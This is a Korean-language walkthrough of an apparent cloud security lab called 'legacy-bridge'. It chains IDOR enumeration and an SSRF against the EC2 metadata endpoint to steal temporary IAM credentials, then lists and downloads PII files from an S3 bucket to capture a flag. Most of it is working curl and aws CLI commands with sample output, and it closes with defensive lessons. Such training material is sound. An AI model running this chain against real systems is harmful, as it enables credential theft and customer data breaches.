# legacy-bridge - Walkthrough

## Step 1: 정찰

게이트웨이 URL을 획득하고 API 포탈에 접속합니다.

### 방법 1: 웹 브라우저 사용

1. 게이트웨이 URL을 웹 브라우저에서 오픈
2. Beaver Finance - Customer Portal 확인:
   - 서비스명: "Beaver Finance - Customer Portal"
   - API 버전: v5.0 production
   - 상태: healthy
3. Document Lookup 섹션 확인

### 방법 2: CLI 사용

```bash
cd terraform
terraform output scenario_entrypoint_url
```

URL 획득 후:

```bash
GW=http://<gateway-ip>
curl -s $GW/api/v5/status
```

---

## Step 2: 정상 기능 테스트

### 방법 1: 웹 브라우저 사용

1. Document Lookup 섹션에서 Document number 칸 확인
2. Document number에 1을 입력
3. "Look up" 버튼 클릭
4. 응답 확인:
   - customer_name: Aaron Whitfield
   - application_id: APP-2024-000142
   - file_name: statement_2024_07.pdf
   - internal_source: http://internal-source-ip/api/v1/legacy/media-info?...
   - metadata: 고객 정보 포함

### 방법 2: CLI 사용

```bash
GW=http://<gateway-ip>
curl -s "$GW/api/v5/legacy/media-info?file_id=1"
curl -s "$GW/api/v5/legacy/media-info?file_id=2"
```

API가 정상 작동함을 확인합니다.

---

## Step 3: 취약점 발견 - IDOR

### 방법 1: 웹 브라우저 사용

1. Document Lookup 섹션에서
2. Document number 칸에 1부터 12까지 순서대로 입력해보기
3. 각각 "Look up" 버튼 클릭
4. 권한 확인 없이 모든 고객의 데이터 접근 가능 확인:
   - Document number 1: Aaron Whitfield
   - Document number 2: 다른 고객
   - Document number 3: 또 다른 고객
   - ...
   - Document number 12: 또 다른 고객
5. 각 응답에서 `internal_source` 필드 확인:
   ```
   http://internal-source-ip/api/v1/legacy/media-info?source=...
   ```

![IDOR Enumeration](./assets/image/legacy-bridge-idor-enumeration.png)

### 방법 2: CLI 사용

```bash
GW=http://<gateway-ip>
for i in {1..12}; do curl -s "$GW/api/v5/legacy/media-info?file_id=$i"; done
```

**IDOR 취약점 확인:** Document number (file_id)만 변경하면 권한 없이 모든 고객 데이터에 접근 가능합니다.

---

## Step 4: 취약점 발견 - SSRF

### 방법 1: 웹 브라우저 사용

1. Document number 칸에 1 입력
2. Source URL (optional) 칸에 `http://example.com` 입력
3. "Look up" 버튼 클릭
4. 응답 확인:
   ```
   backend_response: example.com의 콘텐츠 또는 오류 메시지
   backend_status: 200 또는 502
   ```
5. source 파라미터가 internal source IP로 전달되고 있음 확인

### 방법 2: CLI 사용

```bash
GW=http://<gateway-ip>
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://example.com"
```

**SSRF 취약점 확인:** source 파라미터가 백엔드 서버로 전달되어 임의의 URL 접근 가능합니다.

---

## Step 5: SSRF로 IAM 역할 이름 탈취

### 방법 1: 웹 브라우저 사용

1. Document number 칸에 1 입력
2. Source URL 칸에 IMDSv1 메타데이터 경로 입력:
   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```
3. "Look up" 버튼 클릭
4. 응답의 `backend_response` 필드에서 역할 이름 추출:
   ```
   legacy-bridge-Shadow-API-Role-xxx
   ```
5. 역할 이름을 메모합니다

![IMDS Role Extraction](./assets/image/legacy-bridge-imds-role-extraction.png)

### 방법 2: CLI 사용

```bash
GW=http://<gateway-ip>
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

응답에서 `legacy-bridge-Shadow-API-Role-xxx` 형식의 역할 이름을 추출합니다.

---

## Step 6: IMDSv1에서 임시 자격증명 탈취

### 방법 1: 웹 브라우저 사용

1. Document number 칸에 1 입력
2. Source URL 칸에 Step 5의 역할 이름으로 구성:
   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/legacy-bridge-Shadow-API-Role-xxx
   ```
3. "Look up" 버튼 클릭
4. 응답의 `backend_response` 필드에 JSON 자격증명:
   ```json
   {
     "Code": "Success",
     "LastUpdated": "2026-05-01T00:12:34Z",
     "Type": "AWS-HMAC",
     "AccessKeyId": "",
     "SecretAccessKey": "",
     "Token": "",
     "Expiration": "2026-05-01T06:27:25Z"
   }
   ```
5. 모든 자격증명 정보 메모

![IMDS Credentials Extraction](./assets/image/legacy-bridge-imds-credentials-extraction.png)

### 방법 2: CLI 사용

```bash
GW=http://<gateway-ip>
ROLE="legacy-bridge-Shadow-API-Role-xxx"
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
```

응답에서 다음 자격증명을 추출합니다:
```
AccessKeyId
SecretAccessKey
Token
Expiration
```

---

## Step 7: AWS CLI 환경 설정

### CLI 사용

Step 6에서 탈취한 임시 자격증명을 환경변수로 설정합니다:

```bash
export AWS_ACCESS_KEY_ID=""
export AWS_SECRET_ACCESS_KEY=""
export AWS_SESSION_TOKEN=""
export AWS_DEFAULT_REGION="us-east-1"
```

---

## Step 8: 자격증명 유효성 확인

### CLI 사용

탈취한 자격증명이 실제로 작동하는지 확인합니다:

```bash
aws sts get-caller-identity
```

출력:
```json
{
    "UserId": "AROAY5XXXXXXXXXXX:i-0xxxxxxxxxxxxxxx",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:assumed-role/legacy-bridge-Shadow-API-Role-xxx/i-0xxxxxxxxxxxxxxx"
}
```

`legacy-bridge-Shadow-API-Role-xxx` 역할로 인증됨을 확인합니다.

---

## Step 9: IAM 정책 분석

### CLI 사용

할당된 정책의 상세 내용을 확인합니다:

```bash
ROLE_NAME="legacy-bridge-Shadow-API-Role-xxx"
aws iam get-role-policy --role-name $ROLE_NAME --policy-name shadow-api-policy
```

출력:
```json
{
    "RoleName": "legacy-bridge-Shadow-API-Role-xxx",
    "PolicyName": "shadow-api-policy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "S3ReadAccess",
                "Effect": "Allow",
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Resource": [
                    "arn:aws:s3:::prime-pii-vault-*",
                    "arn:aws:s3:::prime-pii-vault-*/*"
                ]
            }
        ]
    }
}
```

이 역할은 `prime-pii-vault-*` 버킷에 대해 `GetObject`와 `ListBucket` 권한을 가집니다.

---

## Step 10: S3 버킷 목록 조회

### CLI 사용

접근 가능한 S3 버킷을 확인합니다:

```bash
aws s3 ls
```

출력:
```
2026-05-01 00:00:00 prime-pii-vault-xxx
```

버킷 내용을 확인합니다:

```bash
aws s3 ls s3://prime-pii-vault-xxx/ --recursive
```

출력:
```
2026-05-01 00:00:00          1024 applications/customer_credit_applications.csv
2026-05-01 00:00:00           512 applications/migration_log.txt
2026-05-01 00:00:00           256 applications/q1_2024_summary.txt
2026-05-01 00:00:00          2048 confidential/breach_notice.txt
```

---

## Step 11: 민감한 데이터 탈취

### CLI 사용

고객 신용 신청서를 다운로드합니다:

```bash
aws s3 cp s3://prime-pii-vault-xxx/applications/customer_credit_applications.csv .
cat customer_credit_applications.csv
```

출력:
```
customer_id,name,ssn,email,phone,credit_score
001,John Doe,123-45-6789,john@example.com,555-1234,750
002,Jane Smith,987-65-4321,jane@example.com,555-5678,720
```

수천 개의 고객 신용 신청서가 노출됩니다. 각각에는 이름, 주민등록번호, 이메일, 전화번호, 신용점수 등 민감한 정보가 포함되어 있습니다.

---

## Step 12: 플래그 획득

### CLI 사용

침해 통지 파일을 다운로드합니다:

```bash
aws s3 cp s3://prime-pii-vault-xxx/confidential/breach_notice.txt .
cat breach_notice.txt
```

출력 결과에 플래그가 포함됩니다.

---

## 공격 체인

```
1. Beaver Finance API Portal (v5)
   ↓ IDOR via file_id parameter (sequential enumeration)
2. Customer Data Leak
   ↓ internal_source field exposing backend URL
3. SSRF via source parameter
   ↓ source parameter forwarded to backend
4. IMDSv1 Access (169.254.169.254)
   ↓ Query /latest/meta-data/iam/security-credentials/
5. Extract IAM Role Name
   ↓ legacy-bridge-Shadow-API-Role-xxx
6. IMDSv1 Credential Extraction
   ↓ AccessKeyId, SecretAccessKey, Token
7. AWS CLI Configuration
   ↓ Export credentials as environment variables
8. sts:GetCallerIdentity
   ↓ Verify assumed role identity
9. iam:GetRolePolicy
   ↓ Analyze policy - find S3 read access
10. s3:ListBucket
    ↓ Enumerate bucket contents (prime-pii-vault-xxx)
11. s3:GetObject
    ↓ Download PII data (customer_credit_applications.csv, breach_notice.txt)
12. Flag extraction from breach_notice.txt
    ↓ 출력 결과에 플래그가 포함됩니다
```

---

## 핵심 기법

### IDOR 파라미터 조작
순차적인 ID를 사용하여 권한 없이 다른 사용자의 데이터에 접근합니다:
```bash
curl -s "$GW/api/v5/legacy/media-info?file_id=1"
curl -s "$GW/api/v5/legacy/media-info?file_id=2"
curl -s "$GW/api/v5/legacy/media-info?file_id=12"
```

### SSRF를 통한 메타데이터 접근
source 파라미터를 이용해 공격자가 지정한 URL로 요청을 강제합니다:
```bash
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
```

### IMDSv1 vs IMDSv2 비교

| 특성 | IMDSv1 | IMDSv2 |
|------|--------|--------|
| 토큰 필요 여부 | 불필요 | **필수** |
| SSRF 공격에 취약 | **예** | **아니오** |
| 접근 방식 | URL 직접 접근 | PUT 요청 + 토큰 |
| 보안 수준 | 낮음 | 높음 |

---

## 보안 교훈

### 1. 입력값 검증
- 파라미터 값을 화이트리스트 기반으로 검증해야 합니다
- 사용자 입력을 절대 신뢰하면 안 됩니다
- file_id는 숫자만, source는 특정 도메인만 허용

### 2. 메타데이터 서비스 보안
- 모든 EC2 인스턴스에서 IMDSv2를 강제해야 합니다
- IMDSv1은 반드시 비활성화해야 합니다
- 보안 그룹으로 메타데이터 접근을 제한합니다

### 3. 최소 권한 원칙 (Least Privilege)
- IAM 역할에는 필요한 최소 권한만 부여합니다
- Resource에 와일드카드("*") 사용을 피합니다
- 특정 S3 버킷과 객체만 명시적으로 허용합니다

### 4. 심층 방어 전략
- WAF(Web Application Firewall)로 IDOR/SSRF 패턴 탐지
- CloudTrail로 모든 S3 접근 기록
- GuardDuty로 비정상 API 호출 탐지
- 민감한 데이터에 대한 접근 제어와 감시
